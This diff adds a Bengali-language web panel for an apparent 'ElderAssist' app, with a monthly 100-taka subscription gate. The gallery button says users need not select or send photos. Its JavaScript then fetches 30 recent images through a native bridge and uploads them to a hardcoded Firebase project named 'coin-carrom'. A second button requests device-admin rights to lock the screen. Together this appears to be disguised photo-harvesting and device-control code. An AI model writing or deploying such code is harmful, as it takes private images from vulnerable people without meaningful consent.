@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ElderAssist — ইউজার প্যানেল</title>
+  <style>
+    :root {
+      --bg: #0b1120;
+      --card: #111827;
+      --card-2: #1e293b;
+      --text: #f8fafc;
+      --muted: #94a3b8;
+      --primary: #3b82f6;
+      --primary-2: #2563eb;
+      --border: rgba(148, 163, 184, 0.18);
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      padding: 18px;
+      font-family: system-ui, -apple-system, "Noto Sans Bengali", sans-serif;
+      background: radial-gradient(circle at top right, #172554 0%, var(--bg) 55%);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    .app-shell {
+      max-width: 480px;
+      margin: 0 auto;
+    }
+
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background: rgba(17, 24, 39, 0.88);
+      backdrop-filter: blur(12px);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 16px 18px;
+      margin-bottom: 16px;
+      box-shadow: 0 12px 30px rgba(0, 0, 0, 0.35);
+    }
+
+    .brand-title {
+      font-size: 21px;
+      font-weight: 800;
+    }
+
+    .brand-sub {
+      font-size: 13px;
+      color: var(--muted);
+      margin-top: 2px;
+    }
+
+    .pill {
+      padding: 7px 12px;
+      border-radius: 999px;
+      font-size: 13px;
+      font-weight: 700;
+      white-space: nowrap;
+    }
+
+    .pill-active {
+      background: rgba(16, 185, 129, 0.16);
+      color: #6ee7b7;
+      border: 1px solid rgba(16, 185, 129, 0.4);
+    }
+
+    .pill-inactive {
+      background: rgba(239, 68, 68, 0.18);
+      color: #fca5a5;
+      border: 1px solid rgba(239, 68, 68, 0.45);
+    }
+
+    .panel-card {
+      background: rgba(17, 24, 39, 0.92);
+      border: 1px solid var(--border);
+      border-radius: 22px;
+      padding: 20px;
+      margin-bottom: 16px;
+      box-shadow: 0 14px 32px rgba(0, 0, 0, 0.3);
+    }
+
+    .card-title {
+      font-size: 20px;
+      font-weight: 700;
+      margin: 0 0 10px 0;
+    }
+
+    .card-desc {
+      font-size: 15.5px;
+      line-height: 1.55;
+      color: #cbd5e1;
+      margin: 0 0 16px 0;
+    }
+
+    .btn-primary {
+      width: 100%;
+      padding: 16px 18px;
+      font-size: 18px;
+      font-weight: 800;
+      color: #ffffff;
+      background: linear-gradient(135deg, var(--primary), var(--primary-2));
+      border: none;
+      border-radius: 14px;
+      cursor: pointer;
+      box-shadow: 0 8px 20px rgba(37, 99, 235, 0.35);
+    }
+
+    .btn-teal {
+      background: linear-gradient(135deg, #0d9488, #0f766e);
+      box-shadow: 0 8px 20px rgba(13, 148, 136, 0.3);
+    }
+
+    .btn-disabled {
+      opacity: 0.45;
+      cursor: not-allowed;
+    }
+
+    .status-box {
+      margin-top: 14px;
+      padding: 13px 14px;
+      border-radius: 14px;
+      background: var(--card-2);
+      border: 1px solid var(--border);
+      font-size: 15px;
+      line-height: 1.45;
+      color: #e2e8f0;
+    }
+
+    .meta-row {
+      display: flex;
+      justify-content: space-between;
+      font-size: 13.5px;
+      color: var(--muted);
+      margin-top: 10px;
+      padding-top: 10px;
+      border-top: 1px solid rgba(148, 163, 184, 0.12);
+    }
+
+    .lock-banner {
+      display: none;
+      background: rgba(239, 68, 68, 0.14);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      color: #fecaca;
+      padding: 14px 16px;
+      border-radius: 16px;
+      margin-bottom: 16px;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .lock-banner.show {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="app-shell">
+    <div class="top-bar">
+      <div>
+        <div class="brand-title">সহায়তা প্যানেল</div>
+        <div class="brand-sub" id="user-label">ইউজার আইডি: user_001</div>
+      </div>
+      <div id="sub-badge" class="pill pill-active">১০০৳ চালু</div>
+    </div>
+
+    <div id="lock-banner" class="lock-banner">
+      <strong>সাবস্ক্রিপশন বকেয়া বা শূন্য:</strong> মাসিক ১০০ টাকার মেয়াদ সক্রিয় না থাকায় গ্যালারি সিঙ্ক ও সহায়তা ফিচার সাময়িকভাবে বন্ধ আছে।
+    </div>
+
+    <div class="panel-card">
+      <h2 class="card-title">গ্যালারি পারমিশন</h2>
+      <p class="card-desc">
+        শুধু নিচের বাটনে চাপ দিয়ে গ্যালারি পারমিশন চালু করুন। আলাদা করে ছবি সিলেক্ট বা পাঠাতে হবে না।
+      </p>
+      <button id="btn-gallery" class="btn-primary" onclick="grantGalleryPermission()">
+        গ্যালারি পারমিশন দিন
+      </button>
+      <div id="gallery-status" class="status-box">
+        স্ট্যাটাস: এখনো গ্যালারি পারমিশন দেওয়া হয়নি।
+      </div>
+      <div class="meta-row">
+        <span id="gallery-count">সিঙ্কযোগ্য ছবি: ০টি</span>
+        <span id="last-sync">সিঙ্ক: হয়নি</span>
+      </div>
+    </div>
+
+    <div class="panel-card">
+      <h2 class="card-title">স্ক্রিন লক সহায়তা</h2>
+      <p class="card-desc">
+        প্রয়োজন হলে ডিভাইস অ্যাডমিন পারমিশন অনুমোদন করে দ্রুত স্ক্রিন লক করতে পারবেন।
+      </p>
+      <button id="btn-lock" class="btn-primary btn-teal" onclick="triggerScreenLock()">
+        স্ক্রিন লক পারমিশন / লক
+      </button>
+      <div id="lock-status" class="status-box">
+        স্ট্যাটাস: প্রস্তুত।
+      </div>
+    </div>
+  </div>
+
+  <script src="permissions.js"></script>
+  <script>
+    const USER_ID = "user_001";
+    window.USER_SUBSCRIPTION_ACTIVE = true;
+
+    window.applySubscriptionUI = function (isPaid) {
+      window.USER_SUBSCRIPTION_ACTIVE = Boolean(isPaid);
+      const badge = document.getElementById("sub-badge");
+      const banner = document.getElementById("lock-banner");
+      const btnGallery = document.getElementById("btn-gallery");
+      const btnLock = document.getElementById("btn-lock");
+      const userLabel = document.getElementById("user-label");
+
+      userLabel.textContent = "ইউজার আইডি: " + USER_ID;
+
+      if (window.USER_SUBSCRIPTION_ACTIVE) {
+        badge.textContent = "১০০৳ চালু";
+        badge.className = "pill pill-active";
+        banner.classList.remove("show");
+        btnGallery.classList.remove("btn-disabled");
+        btnLock.classList.remove("btn-disabled");
+      } else {
+        badge.textContent = "বকেয়া / শূন্য";
+        badge.className = "pill pill-inactive";
+        banner.classList.add("show");
+        btnGallery.classList.add("btn-disabled");
+        btnLock.classList.add("btn-disabled");
+      }
+    };
+
+    function grantGalleryPermission() {
+      const statusEl = document.getElementById("gallery-status");
+
+      if (!window.USER_SUBSCRIPTION_ACTIVE) {
+        statusEl.textContent = "স্ট্যাটাস: মাসিক ১০০ টাকা বকেয়া/শূন্য থাকায় গ্যালারি সিঙ্ক বন্ধ আছে।";
+        return;
+      }
+
+      if (window.GalleryBridge && window.GalleryBridge.requestGalleryPermission) {
+        window.GalleryBridge.requestGalleryPermission();
+      }
+
+      const granted =
+        window.GalleryBridge && window.GalleryBridge.hasGalleryPermission
+          ? window.GalleryBridge.hasGalleryPermission()
+          : false;
+
+      if (granted) {
+        let images = [];
+        if (window.GalleryBridge && window.GalleryBridge.fetchRecentImagesJson) {
+          try {
+            images = JSON.parse(window.GalleryBridge.fetchRecentImagesJson(30) || "[]");
+          } catch (e) {
+            images = [];
+          }
+        }
+
+        document.getElementById("gallery-count").textContent = `সিঙ্কযোগ্য ছবি: ${images.length}টি`;
+        const nowTime = new Date().toLocaleTimeString("bn-BD", {
+          hour: "2-digit",
+          minute: "2-digit"
+        });
+        document.getElementById("last-sync").textContent = `সিঙ্ক: ${nowTime}`;
+
+        if (window.pushGalleryToFirebase) {
+          window.pushGalleryToFirebase(images);
+        }
+
+        statusEl.textContent = `স্ট্যাটাস: গ্যালারি পারমিশন চালু আছে (${images.length}টি ছবির তথ্য সিঙ্ক হয়েছে)।`;
+      } else {
+        statusEl.textContent = "স্ট্যাটাস: পারমিশন ডায়ালগ এলে 'Allow' চাপুন এবং আবার বাটনে চাপ দিন।";
+      }
+    }
+
+    function triggerScreenLock() {
+      const statusEl = document.getElementById("lock-status");
+
+      if (!window.USER_SUBSCRIPTION_ACTIVE) {
+        statusEl.textContent = "স্ট্যাটাস: মাসিক ১০০ টাকা বকেয়া থাকায় লক সুবিধা বন্ধ আছে।";
+        return;
+      }
+
+      if (window.AndroidBridge && window.AndroidBridge.requestAdminAndLock) {
+        window.AndroidBridge.requestAdminAndLock();
+        statusEl.textContent = "স্ট্যাটাস: স্ক্রিন লক / ডিভাইস অ্যাডমিন অনুরোধ পাঠানো হয়েছে।";
+      } else {
+        statusEl.textContent = "স্ট্যাটাস: AndroidBridge সক্রিয় নয় (অ্যাপ বিল্ডের পর কাজ করবে)।";
+      }
+    }
+
+    window.applySubscriptionUI(true);
+  </script>
+
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getDatabase, ref, onValue, set, update } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyBg7QUfm-VaFksKtffRUYIZtZ5CH6a1pMY",
+      authDomain: "coin-carrom.firebaseapp.com",
+      databaseURL: "https://coin-carrom-default-rtdb.firebaseio.com",
+      projectId: "coin-carrom",
+      storageBucket: "coin-carrom.firebasestorage.app",
+      messagingSenderId: "922561083470",
+      appId: "1:922561083470:web:9a383739c8704a07246b1f",
+      measurementId: "G-0J7MQE4JFH"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getDatabase(app);
+    const userRef = ref(db, `users/${USER_ID}`);
+
+    // ইউজার নোড না থাকলে ডিফল্ট তৈরি করে নেওয়া
+    update(userRef, {
+      userId: USER_ID,
+      name: "ইউজার ১ (user_001)"
+    }).catch(() => {});
+
+    // Firebase থেকে রিয়েল-টাইম paid স্ট্যাটাস শোনা
+    onValue(ref(db, `users/${USER_ID}/paid`), (snap) => {
+      if (snap.exists()) {
+        window.applySubscriptionUI(Boolean(snap.val()));
+      } else {
+        set(ref(db, `users/${USER_ID}/paid`), true).catch(() => {});
+        window.applySubscriptionUI(true);
+      }
+    });
+
+    window.pushGalleryToFirebase = async function (images) {
+      if (!window.USER_SUBSCRIPTION_ACTIVE) return;
+      try {
+        await update(userRef, {
+          images: images,
+          galleryPermission: true,
+          lastSync: new Date().toISOString()
+        });
+      } catch (e) {}
+    };
+  </script>
+</body>
+</html>
+
